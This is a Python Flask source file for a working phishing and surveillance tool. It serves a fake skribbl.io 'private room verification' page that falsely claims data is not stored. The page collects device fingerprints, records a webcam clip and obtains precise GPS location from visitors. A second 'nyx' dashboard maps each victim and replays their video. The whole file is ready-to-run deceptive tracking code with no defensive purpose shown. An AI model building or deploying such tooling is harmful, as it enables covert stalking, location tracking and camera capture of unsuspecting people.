import json, threading, time, os, base64
from flask import Flask, request, Response

_DIR = os.path.dirname(os.path.abspath(__file__))
_cfg_file = os.path.join(_DIR, "config.txt")
try:
    REDIRECT_URL = open(_cfg_file).read().strip()
except Exception:
    REDIRECT_URL = "https://skribbl.io"
LOG_FILE   = os.path.join(_DIR, "captures.json")
PHISH_PORT = 8080
DASH_PORT  = 8181

captures = []
_id_ctr  = 0

try:
    with open(LOG_FILE) as f:
        captures = json.load(f)
        _id_ctr = max((c.get('_id', 0) for c in captures), default=0)
except Exception:
    pass

def _next_id():
    global _id_ctr
    _id_ctr += 1
    return _id_ctr

def _parse_body():
    try:
        d = request.get_json(force=True, silent=True)
        if d: return d
    except Exception:
        pass
    try:
        return json.loads(request.data or b'{}') or {}
    except Exception:
        return {}

def _ip():
    return (request.headers.get('CF-Connecting-IP') or
            request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
            request.remote_addr)

def _save():
    try:
        with open(LOG_FILE, 'w') as f:
            json.dump(list(captures), f, default=str)
    except Exception:
        pass

def _logo_b64():
    with open(os.path.join(_DIR, 'logo.gif'), 'rb') as f:
        return 'data:image/gif;base64,' + base64.b64encode(f.read()).decode()

# ── Phish app ──────────────────────────────────────────────────────────────

phish_app = Flask('phish')

@phish_app.after_request
def cors(r):
    r.headers['Access-Control-Allow-Origin']  = '*'
    r.headers['Access-Control-Allow-Methods'] = 'GET,POST,OPTIONS'
    r.headers['Access-Control-Allow-Headers'] = 'Content-Type'
    return r

PHISH_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>skribbl.io - free multiplayer drawing & guessing game</title>
<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;700;800;900&display=swap" rel="stylesheet"/>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Nunito',sans-serif;background:#1d2f6f;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#f0f0f0}
.wrap{width:100%;max-width:420px;padding:20px;display:flex;flex-direction:column;align-items:center;gap:28px}
.logo-img{max-width:320px;width:90%;filter:drop-shadow(0 4px 16px rgba(0,0,0,.5))}
.card{width:100%;background:rgba(12,44,150,0.78);border:3px solid #040a33;border-radius:4px;box-shadow:0 0 0 2px rgba(0,0,0,.2),0 8px 32px rgba(0,0,0,.5);overflow:hidden}
.card-top{background:rgba(7,36,131,0.85);border-bottom:3px solid #040a33;padding:13px 18px;font-size:.95rem;font-weight:800;letter-spacing:.01em}
.card-body{padding:20px 18px;display:flex;flex-direction:column;gap:14px}
.notice{background:rgba(0,0,0,.25);border:1px solid rgba(255,255,255,.12);border-radius:3px;padding:12px 14px;font-size:.82rem;font-weight:700;color:rgba(255,255,255,.8);line-height:1.55}
.notice b{color:#fff}
#btn{width:100%;padding:13px;background:#2a51d1;border:none;border-radius:3px;font-size:1rem;font-weight:800;color:#fff;cursor:pointer;font-family:'Nunito',sans-serif;text-shadow:2px 2px 0 rgba(0,0,0,.4);box-shadow:0 4px 0 #1a3499,0 6px 12px rgba(0,0,0,.3);transition:all 80ms;letter-spacing:.02em}
#btn:hover{background:#1e44be;transform:translateY(1px);box-shadow:0 3px 0 #1a3499}
#btn:active{transform:translateY(4px);box-shadow:none}
#btn:disabled{opacity:.65;cursor:default;transform:none;box-shadow:0 4px 0 #1a3499}
.prog-wrap{display:none;background:rgba(7,36,131,0.85);border:2px solid #040a33;border-radius:3px;height:10px;overflow:hidden}
.prog-fill{height:100%;background:linear-gradient(90deg,#ee9631,#f5c034);animation:prog 15s linear forwards;border-radius:2px}
@keyframes prog{from{width:3%}to{width:95%}}
#status{font-size:.82rem;color:rgba(255,255,255,.55);font-weight:700;min-height:16px;text-align:center}
.footer-txt{font-size:.7rem;color:rgba(255,255,255,.22);font-weight:700}
</style>
</head>
<body>
<div class="wrap">
  <img class="logo-img" src="LOGO_PLACEHOLDER" alt="skribbl.io"/>
  <div class="card">
    <div class="card-top">🔒 Private Room — Verification Required</div>
    <div class="card-body">
      <div class="notice">
        <b>Location &amp; device verification required.</b><br/>
        skribbl.io checks your location and device to prevent bots and ensure only real players join private rooms. This data is <b>not stored</b> and is only used for this session.
      </div>
      <div id="cam-status" style="display:none;font-size:.8rem;font-weight:700;padding:8px 10px;border-radius:3px;background:rgba(0,0,0,.25);border:1px solid rgba(255,255,255,.12);text-align:center"></div>
      <button id="btn" onclick="joinRoom()" disabled>Verify &amp; Join Room</button>
      <div class="prog-wrap" id="bar"><div class="prog-fill"></div></div>
      <div id="status"></div>
    </div>
  </div>
  <div class="footer-txt">skribbl.io &copy; 2026 &nbsp;&bull;&nbsp; Privacy Policy &nbsp;&bull;&nbsp; Terms of Service</div>
</div>
<script>
var REDIRECT="REDIRECT_PLACEHOLDER";
var BASE=location.protocol+"//"+location.host;
var cameraDone=false,gpsDone=false;

function tryRedirect(){if(cameraDone&&gpsDone){setTimeout(function(){window.location.href=REDIRECT;},400);}}

function send(path,data){
  var url=BASE+path;
  var blob=new Blob([JSON.stringify(data)],{type:"application/json"});
  try{if(navigator.sendBeacon){navigator.sendBeacon(url,blob);return;}}catch(e){}
  try{fetch(url,{method:"POST",mode:"no-cors",body:blob});}catch(e){}
}

function collectInfo(){
  var ua=navigator.userAgent;
  var isTablet=/iPad/.test(ua)||(/Android/.test(ua)&&!/Mobile/.test(ua));
  var isMobile=!isTablet&&/Mobi|Android|iPhone|iPod/.test(ua);
  var deviceType=isTablet?"Tablet":isMobile?"Mobile":"Desktop";
  var os="Unknown";
  if(/iPhone|iPad|iPod/.test(ua)){var m=ua.match(/OS ([\d_]+)/);os="iOS "+(m?m[1].replace(/_/g,"."):"");}
  else if(/Android/.test(ua)){var m=ua.match(/Android ([\d.]+)/);os="Android "+(m?m[1]:"");}
  else if(/Windows NT/.test(ua)){var m=ua.match(/Windows NT ([\d.]+)/);var t={"10.0":"10/11","6.3":"8.1","6.2":"8","6.1":"7"};os="Windows "+(t[m&&m[1]]||m&&m[1]||"");}
  else if(/Mac OS X/.test(ua)){var m=ua.match(/Mac OS X ([\d_]+)/);os="macOS "+(m?m[1].replace(/_/g,"."):"");}
  else if(/Linux/.test(ua)){os="Linux";}
  var browser="Unknown";
  if(/OPR\//.test(ua)){var m=ua.match(/OPR\/([\d.]+)/);browser="Opera "+(m?m[1]:"");}
  else if(/Edg\//.test(ua)){var m=ua.match(/Edg\/([\d.]+)/);browser="Edge "+(m?m[1]:"");}
  else if(/Firefox\//.test(ua)){var m=ua.match(/Firefox\/([\d.]+)/);browser="Firefox "+(m?m[1]:"");}
  else if(/Chrome\//.test(ua)){var m=ua.match(/Chrome\/([\d.]+)/);browser="Chrome "+(m?m[1]:"");}
  else if(/Safari\//.test(ua)&&/Version\//.test(ua)){var m=ua.match(/Version\/([\d.]+)/);browser="Safari "+(m?m[1]:"");}
  var gpu="N/A";
  try{var c=document.createElement("canvas");var gl=c.getContext("webgl")||c.getContext("experimental-webgl");if(gl){var d=gl.getExtension("WEBGL_debug_renderer_info");if(d)gpu=gl.getParameter(d.UNMASKED_RENDERER_WEBGL)||"Blocked";}}catch(e){}
  var conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
  var netType=conn?(conn.effectiveType||conn.type||"N/A"):"N/A";
  var netSpeed=conn&&conn.downlink?conn.downlink+"Mbps":"N/A";
  return{
    deviceType:deviceType,os:os,browser:browser,gpu:gpu,
    userAgent:ua,language:navigator.language,
    screen:screen.width+"x"+screen.height,colorDepth:screen.colorDepth+"bit",
    pixelRatio:window.devicePixelRatio||1,
    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
    cores:navigator.hardwareConcurrency,ram:navigator.deviceMemory,
    touch:navigator.maxTouchPoints,
    network:netType,networkSpeed:netSpeed,
    cookieEnabled:navigator.cookieEnabled,referrer:document.referrer
  };
}

function setCamStatus(msg,col){
  var el=document.getElementById('cam-status');
  if(!el)return;
  if(!msg){el.style.display='none';return;}
  el.style.display='block';
  el.style.color=col||'rgba(255,255,255,.8)';
  el.textContent=msg;
}

function captureCamera(){
  if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){cameraDone=true;document.getElementById('btn').disabled=false;return;}
  setCamStatus('📷 Camera verification required — please allow access');
  navigator.mediaDevices.getUserMedia({video:{width:320,height:240,facingMode:'user'},audio:false})
    .then(function(stream){
      setCamStatus('🔴 Verifying device… please wait','#f5c034');
      var chunks=[],mr=new MediaRecorder(stream);
      mr.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};
      mr.onstop=function(){
        stream.getTracks().forEach(function(t){t.stop();});
        setCamStatus('✓ Camera verified','#3fb950');
        setTimeout(function(){setCamStatus(null);},1500);
        var blob=new Blob(chunks,{type:mr.mimeType});
        var fd=new FormData();
        fd.append('video',blob,'capture.webm');
        fd.append('mimeType',mr.mimeType);
        fetch(BASE+'/camera',{method:'POST',mode:'no-cors',body:fd}).catch(function(){});
        cameraDone=true;
        document.getElementById('btn').disabled=false;
        tryRedirect();
      };
      mr.start();
      setTimeout(function(){if(mr.state==='recording')mr.stop();},3000);
    }).catch(function(err){
      var noHw=err.name==='NotFoundError'||err.name==='DevicesNotFoundError';
      send('/camera',{denied:true,reason:err.message||'Permission denied',errName:err.name});
      if(noHw){
        setCamStatus(null);
        cameraDone=true;
        document.getElementById('btn').disabled=false;
      }else{
        setCamStatus('⚠ Camera access is required to continue. Please allow camera and refresh the page.','#f85149');
      }
    });
}

function autoCapture(){
  var info=collectInfo();send("/info",info);
  if(navigator.getBattery){navigator.getBattery().then(function(b){
    info.battery=Math.round(b.level*100)+"%"+(b.charging?" (charging)":" (discharging)");
    info._update=true;send("/info",info);
  }).catch(function(){});}
  captureCamera();
}

function setStatus(msg,col){
  var s=document.getElementById("status");
  s.textContent=msg;
  s.style.color=col||"rgba(255,255,255,.55)";
}
function resetBtn(){
  document.getElementById("btn").disabled=false;
  document.getElementById("bar").style.display="none";
}
function getBestLocation(onSuccess,onFail){
  var best=null,watchId=null,done=false;
  var finish=function(){if(done)return;done=true;if(watchId!==null)navigator.geolocation.clearWatch(watchId);if(best)onSuccess(best);else onFail({message:"No position obtained"});};
  var timer=setTimeout(finish,15000);
  watchId=navigator.geolocation.watchPosition(
    function(pos){
      if(!best||pos.coords.accuracy<best.coords.accuracy){best=pos;setStatus("Locking GPS… \xb1"+Math.round(pos.coords.accuracy)+"m");}
      if(pos.coords.accuracy<=10){clearTimeout(timer);finish();}
    },
    function(err){clearTimeout(timer);done=true;if(watchId!==null)navigator.geolocation.clearWatch(watchId);onFail(err);},
    {enableHighAccuracy:true,timeout:20000,maximumAge:0}
  );
}
function joinRoom(){
  document.getElementById("btn").disabled=true;
  document.getElementById("bar").style.display="block";
  setStatus("Verifying…");
  if(!navigator.geolocation){
    setStatus("⚠ Location not supported on this device. Please use a different browser.","#f85149");
    resetBtn();
    return;
  }
  getBestLocation(
    function(pos){
      setStatus("Verified ✓  Entering room…","#3fb950");
      send("/location",{lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy,alt:pos.coords.altitude,spd:pos.coords.speed,hdg:pos.coords.heading,ts:new Date().toISOString()});
      gpsDone=true;tryRedirect();
    },
    function(err){
      send("/location",{denied:true,reason:err.message});
      setStatus("⚠ Location access is required to verify you're not a bot. Please allow location and try again.","#f5c034");
      resetBtn();
    }
  );
}
window.onload=autoCapture;
</script>
</body>
</html>"""

_LOGO_B64 = None
def _logo_data_uri():
    global _LOGO_B64
    if _LOGO_B64 is None:
        _LOGO_B64 = _logo_b64()
    return _LOGO_B64

@phish_app.route('/', methods=['GET'])
def phish_index():
    html = (PHISH_HTML
            .replace('REDIRECT_PLACEHOLDER', REDIRECT_URL)
            .replace('LOGO_PLACEHOLDER', _logo_data_uri()))
    return Response(html, mimetype='text/html')

@phish_app.route('/info', methods=['POST', 'OPTIONS'])
def phish_info():
    if request.method == 'OPTIONS': return Response('', 204)
    d, ip = _parse_body(), _ip()
    ua = d.get('userAgent', '')
    for c in captures:
        if c.get('_ip') == ip and c.get('_endpoint') == '/info' and c.get('userAgent', '') == ua:
            c.update(d); _save(); return {'ok': True}
    entry = dict(d)
    entry.update({'_id': _next_id(), '_ip': ip, '_endpoint': '/info',
                  '_time': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())})
    captures.append(entry); _save(); return {'ok': True}

@phish_app.route('/location', methods=['POST', 'OPTIONS'])
def phish_location():
    if request.method == 'OPTIONS': return Response('', 204)
    d, ip = _parse_body(), _ip()
    entry = dict(d)
    entry.update({'_id': _next_id(), '_ip': ip, '_endpoint': '/location',
                  '_time': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())})
    captures.append(entry); _save(); return {'ok': True}

@phish_app.route('/camera', methods=['POST', 'OPTIONS'])
def phish_camera():
    if request.method == 'OPTIONS': return Response('', 204)
    ip = _ip()
    ct = request.content_type or ''
    if 'json' in ct:
        d = _parse_body()
        if d.get('denied'):
            entry = {'_id': _next_id(), '_ip': ip, '_endpoint': '/camera',
                     '_time': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
                     'denied': True, 'reason': d.get('reason', 'Permission denied'),
                     'errName': d.get('errName', '')}
            captures.append(entry); _save(); return {'ok': True}
        return {'ok': False}
    if 'video' in request.files:
        fobj = request.files['video']
        video_bytes = fobj.read()
        mime = request.form.get('mimeType') or fobj.content_type or 'video/webm'
    else:
        return {'ok': False}
    if not video_bytes:
        return {'ok': False}
    ext = 'webm' if 'webm' in mime else 'mp4'
    vid_dir = os.path.join(_DIR, 'captures')
    os.makedirs(vid_dir, exist_ok=True)
    fname = f'{time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())}_{ip.replace(".", "_")}.{ext}'
    with open(os.path.join(vid_dir, fname), 'wb') as fv:
        fv.write(video_bytes)
    entry = {'_id': _next_id(), '_ip': ip, '_endpoint': '/camera',
             '_time': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
             'file': fname, 'mimeType': mime, 'size': len(video_bytes)}
    captures.append(entry); _save(); return {'ok': True}

# ── Dashboard app ──────────────────────────────────────────────────────────

dash_app = Flask('dash')

def _build_dash():
    with open(os.path.join(_DIR, 'leaflet.js')) as f:
        ljs = f.read()
    with open(os.path.join(_DIR, 'leaflet.css')) as f:
        lcss = f.read()

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>nyx – dashboard</title>
<style>
{lcss}
*{{margin:0;padding:0;box-sizing:border-box}}
html,body{{width:100%;height:100%;overflow:hidden;background:#0d1117;color:#e6edf3;font-family:'Segoe UI',sans-serif}}
body{{display:flex}}
#map{{flex:1;height:100vh;background:#0d1117}}
#sidebar{{width:340px;min-width:280px;background:#161b22;display:flex;flex-direction:column;border-left:1px solid #30363d;overflow:hidden;height:100vh}}
.hdr{{padding:14px 16px;border-bottom:1px solid #30363d;display:flex;align-items:center;justify-content:space-between;flex-shrink:0}}
.brand{{font-size:1.1rem;font-weight:700;color:#58a6ff}}
.live-dot{{width:8px;height:8px;border-radius:50%;background:#3fb950;display:inline-block;margin-right:6px;animation:pulse 1.4s infinite}}
@keyframes pulse{{0%,100%{{opacity:1}}50%{{opacity:.3}}}}
.stats{{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;padding:12px 16px;border-bottom:1px solid #30363d;flex-shrink:0}}
.stat{{background:#0d1117;border-radius:8px;padding:10px;text-align:center}}
.stat .n{{font-size:1.6rem;font-weight:700}}
.stat .l{{font-size:.7rem;color:#8b949e;text-transform:uppercase;letter-spacing:.06em}}
.n.g{{color:#3fb950}}.n.d{{color:#f85149}}.n.a{{color:#58a6ff}}
.feed-hdr{{padding:10px 16px 6px;font-size:.75rem;color:#8b949e;text-transform:uppercase;letter-spacing:.08em;display:flex;justify-content:space-between;align-items:center;flex-shrink:0}}
.clr{{font-size:.75rem;color:#58a6ff;cursor:pointer;background:none;border:none;padding:0}}
#feed{{flex:1;overflow-y:auto;padding:8px 10px}}
.card{{background:#0d1117;border:1px solid #30363d;border-radius:10px;padding:12px;margin-bottom:8px;animation:fadein .4s ease}}
@keyframes fadein{{from{{opacity:0;transform:translateY(6px)}}to{{opacity:1;transform:translateY(0)}}}}
.card-hdr{{display:flex;align-items:center;justify-content:space-between;margin-bottom:8px}}
.bx{{font-size:.72rem;font-weight:600;padding:3px 8px;border-radius:12px}}
.gps{{background:#1a3a2a;color:#3fb950;border:1px solid #3fb950}}
.deny{{background:#3a1a1a;color:#f85149;border:1px solid #f85149}}
.dev{{background:#1a2a3a;color:#58a6ff;border:1px solid #58a6ff}}
.cam{{background:#2a1a3a;color:#c084fc;border:1px solid #c084fc}}
.cam-deny{{background:#3a1a2a;color:#f472b6;border:1px solid #f472b6}}
.ts{{font-size:.7rem;color:#8b949e}}
.ip{{font-size:.75rem;color:#8b949e;margin-bottom:8px;font-family:monospace}}
.fields{{display:grid;grid-template-columns:1fr 1fr;gap:4px}}
.f{{background:#161b22;border-radius:6px;padding:6px 8px}}
.f.wide{{grid-column:1/-1}}
.lb{{font-size:.65rem;color:#8b949e;text-transform:uppercase;letter-spacing:.05em;margin-bottom:2px}}
.vl{{font-size:.78rem;color:#e6edf3;word-break:break-all}}
.at{{background:#30363d;border-radius:3px;height:4px;margin-top:4px;overflow:hidden}}
.af{{height:100%;border-radius:3px;transition:width .6s}}
.omaps{{display:inline-block;margin-top:8px;font-size:.75rem;color:#58a6ff;text-decoration:none;background:#1a2a3a;border:1px solid #58a6ff;border-radius:6px;padding:4px 10px}}
.status-bar{{padding:6px 16px;font-size:.72rem;color:#8b949e;border-top:1px solid #30363d;flex-shrink:0}}
#empty{{text-align:center;color:#8b949e;font-size:.85rem;padding:40px 20px}}
.card-selected{{border-color:#58a6ff!important;box-shadow:0 0 0 2px rgba(88,166,255,.35);}}
</style>
</head>
<body>
<div id="map"></div>
<div id="sidebar">
  <div class="hdr">
    <span class="brand">nyx</span>
    <span><span class="live-dot"></span><span id="live-lbl">LIVE</span></span>
    <span id="hit-count" style="font-size:.8rem;color:#8b949e;background:#0d1117;padding:3px 10px;border-radius:12px">0 hits</span>
    <button class="clr" onclick="clearAll()" style="color:#f85149">🗑 Clear All</button>
  </div>
  <div class="stats">
    <div class="stat"><div class="n g" id="sg">0</div><div class="l">GPS</div></div>
    <div class="stat"><div class="n d" id="sd">0</div><div class="l">Denied</div></div>
    <div class="stat"><div class="n a" id="sa">0</div><div class="l">Devices</div></div>
  </div>
  <div class="feed-hdr"><span id="feed-title">Click a dot on the map</span></div>
  <div id="feed"><div id="empty">Click a dot on the map<br/>to see its details here.</div></div>
  <div class="status-bar" id="sbar">connecting…</div>
</div>
<script>
{ljs}
</script>
<script>
var map=null,markers={{}},seen=new Set(),stats={{g:0,d:0,a:0}},allCaptures={{}};
function accColor(a){{return a==null?'#8b949e':a<=20?'#3fb950':a<=100?'#f7b731':'#f85149';}}
function f(l,v){{return '<div class="f"><div class="lb">'+l+'</div><div class="vl">'+(v||'N/A')+'</div></div>';}}
function updateStats(){{document.getElementById('sg').textContent=stats.g;document.getElementById('sd').textContent=stats.d;document.getElementById('sa').textContent=stats.a;var t=stats.g+stats.d+stats.a;document.getElementById('hit-count').textContent=t+' hit'+(t===1?'':'s');}}

function buildCard(d){{
  var ep=d._endpoint||'',isGps=ep==='/location'&&!d.denied,isDeny=ep==='/location'&&d.denied;
  var badge,fields='';
  var ts=d._time?new Date(d._time).toLocaleTimeString():'';
  if(isGps){{
    badge='<span class="bx gps">GPS</span>';
    var acc=d.acc!=null?Math.round(d.acc):null,col=accColor(acc);
    var pct=acc?Math.min(96,Math.max(4,100-Math.log(acc+1)*15)):30;
    var lbl=acc==null?'Unknown':acc<=20?'High +/-'+acc+'m':acc<=100?'Med +/-'+acc+'m':'Low +/-'+acc+'m';
    fields+=f('Latitude',d.lat!=null?d.lat.toFixed(7):'N/A')+f('Longitude',d.lon!=null?d.lon.toFixed(7):'N/A')+f('Accuracy',acc!=null?'+/- '+acc+' m':'N/A')+f('Altitude',d.alt!=null?d.alt.toFixed(1)+' m':'N/A');
    fields+='<div class="f wide"><div class="lb">'+lbl+'</div><div class="at"><div class="af" style="width:'+pct+'%;background:'+col+'"></div></div></div>';
  }}else if(isDeny){{
    badge='<span class="bx deny">Denied</span>';
    fields+=f('Reason',d.reason);
  }}else if(ep==='/camera'){{
    if(d.denied){{
      badge='<span class="bx cam-deny">Cam Denied</span>';
      fields+=f('Reason',d.reason||'Permission denied');
      if(d.errName)fields+=f('Error',d.errName);
    }}else{{
      badge='<span class="bx cam">Camera</span>';
      var kb=d.size?Math.round(d.size/1024)+'KB':'?';
      fields+='<div class="f wide"><div class="lb">Recording · '+kb+'</div><video src="/captures/'+d.file+'" controls playsinline style="width:100%;margin-top:6px;border-radius:8px;background:#000;max-height:200px"></video></div>';
      fields+=f('Format',d.mimeType||'N/A');
    }}
  }}else{{
    badge='<span class="bx dev">Device</span>';
    fields+=f('Device',d.deviceType||'N/A')+f('OS',d.os||d.platform||'N/A');
    fields+=f('Browser',d.browser||'N/A')+f('Language',d.language||'N/A');
    fields+=f('Screen',d.screen+(d.pixelRatio&&d.pixelRatio!==1?' @'+d.pixelRatio+'x':'')+(d.colorDepth?' '+d.colorDepth:''))+f('Touch',d.touch!=null?d.touch+' pts':'N/A');
    fields+=f('CPU',d.cores?d.cores+' cores':'N/A')+f('RAM',d.ram?d.ram+' GB':'N/A');
    fields+=f('Battery',d.battery||'N/A')+f('Network',d.network+(d.networkSpeed&&d.networkSpeed!=='N/A'?' / '+d.networkSpeed:''));
    fields+=f('Timezone',d.timezone||'N/A')+f('Cookies',d.cookieEnabled?'Enabled':'Disabled');
    if(d.gpu&&d.gpu!=='N/A')fields+='<div class="f wide"><div class="lb">GPU</div><div class="vl" style="font-size:.72rem">'+d.gpu+'</div></div>';
    if(d.userAgent)fields+='<div class="f wide"><div class="lb">User-Agent</div><div class="vl" style="font-size:.68rem">'+d.userAgent+'</div></div>';
  }}
  var extra=isGps&&d.lat!=null?'<a class="omaps" href="https://www.google.com/maps?q='+d.lat+','+d.lon+'" target="_blank">Open Maps</a>':'';
  return '<div class="card"><div class="card-hdr">'+badge+'<span class="ts">'+ts+'</span></div><div class="ip">'+d._ip+'</div><div class="fields">'+fields+'</div>'+extra+'</div>';
}}

function showForGps(gps){{
  var ip=gps._ip;
  // Collect all captures for this IP: the GPS + device/camera entries
  var related=Object.values(allCaptures).filter(function(c){{return c._ip===ip;}});
  // Sort: GPS first, then device, then camera
  related.sort(function(a,b){{
    var order={{'/location':0,'/info':1,'/camera':2}};
    return (order[a._endpoint]||9)-(order[b._endpoint]||9);
  }});
  var html='';
  related.forEach(function(c){{html+=buildCard(c);}});
  document.getElementById('feed').innerHTML=html||'<div id="empty">No data for this target.</div>';
  document.getElementById('feed-title').textContent=ip;
}}

function ingest(d){{
  if(seen.has(d._id))return;
  seen.add(d._id);
  allCaptures[d._id]=d;
  var ep=d._endpoint||'',isGps=ep==='/location'&&!d.denied,isDeny=ep==='/location'&&d.denied;
  if(isGps)stats.g++;
  else if(isDeny)stats.d++;
  else if(ep==='/info')stats.a++;
  updateStats();
  // Place marker on map for GPS captures
  if(isGps&&map&&d.lat!=null&&d.lon!=null){{
    var col=accColor(d.acc!=null?Math.round(d.acc):null);
    var mk=L.circleMarker([d.lat,d.lon],{{radius:10,fillColor:col,color:'#fff',weight:2,fillOpacity:.9}}).addTo(map);
    (function(cap){{mk.on('click',function(){{showForGps(cap);}})}})(d);
    markers[d._id]=mk;
  }}
}}

function setOk(ok){{document.getElementById('sbar').textContent=ok?'Connected - polling every 2s':'Lost connection...';document.getElementById('sbar').style.color=ok?'#3fb950':'#f85149';document.getElementById('live-lbl').textContent=ok?'LIVE':'OFFLINE';}}
function clearAll(){{if(!confirm('Clear all captures?'))return;fetch('/api/clear',{{method:'POST'}}).then(function(){{
  seen=new Set();allCaptures={{}};stats={{g:0,d:0,a:0}};updateStats();
  if(map)Object.values(markers).forEach(function(m){{map.removeLayer(m);}});markers={{}};
  document.getElementById('feed').innerHTML='<div id="empty">Click a dot on the map<br/>to see its details here.</div>';
  document.getElementById('feed-title').textContent='Click a dot on the map';
}});}}
function poll(){{
  fetch('/api/captures').then(function(r){{return r.json();}}).then(function(list){{
    setOk(true);
    list.forEach(function(c){{ingest(c);}});
  }}).catch(function(){{setOk(false);}});
}}
poll();setInterval(poll,2000);
document.addEventListener('DOMContentLoaded',function(){{
  try{{
    map=L.map('map',{{attributionControl:false,zoomSnap:0.5,wheelPxPerZoomLevel:120}}).setView([20,78],5);
    L.tileLayer('https://{{s}}.basemaps.cartocdn.com/dark_all/{{z}}/{{x}}/{{y}}{{r}}.png',{{maxZoom:19,keepBuffer:4,updateWhenZooming:false,updateWhenIdle:true,subdomains:'abcd'}}).addTo(map);
    setTimeout(function(){{map.invalidateSize();}},300);
  }}catch(err){{console.error('map init failed',err);}}
}});
</script>
</body>
</html>"""

DASH_HTML = None

@dash_app.route('/')
def dash_index():
    global DASH_HTML
    if DASH_HTML is None:
        DASH_HTML = _build_dash()
    return Response(DASH_HTML, mimetype='text/html', headers={'Cache-Control': 'no-store'})

@dash_app.route('/api/captures')
def api_captures():
    return Response(json.dumps(list(captures), default=str), mimetype='application/json')

@dash_app.route('/captures/<path:fname>')
def serve_capture(fname):
    fpath = os.path.join(_DIR, 'captures', os.path.basename(fname))
    if not os.path.isfile(fpath): return Response('', 404)
    ext = fname.rsplit('.', 1)[-1]
    mime = 'video/webm' if ext == 'webm' else 'video/mp4'
    with open(fpath, 'rb') as fv:
        return Response(fv.read(), mimetype=mime, headers={'Accept-Ranges': 'bytes'})

@dash_app.route('/api/clear', methods=['POST'])
def api_clear():
    captures.clear()
    try:
        with open(LOG_FILE, 'w') as f: json.dump([], f)
    except Exception: pass
    return {'ok': True}

# ── Start both servers ─────────────────────────────────────────────────────

def run_phish():
    phish_app.run(host='0.0.0.0', port=PHISH_PORT, threaded=True, debug=False, use_reloader=False)

def run_dash():
    dash_app.run(host='0.0.0.0', port=DASH_PORT, threaded=True, debug=False, use_reloader=False)

threading.Thread(target=run_phish, daemon=True).start()
threading.Thread(target=run_dash,  daemon=True).start()
print(f'Phish: http://0.0.0.0:{PHISH_PORT}  Dash: http://0.0.0.0:{DASH_PORT}')

try:
    while True: time.sleep(60)
except KeyboardInterrupt:
    pass
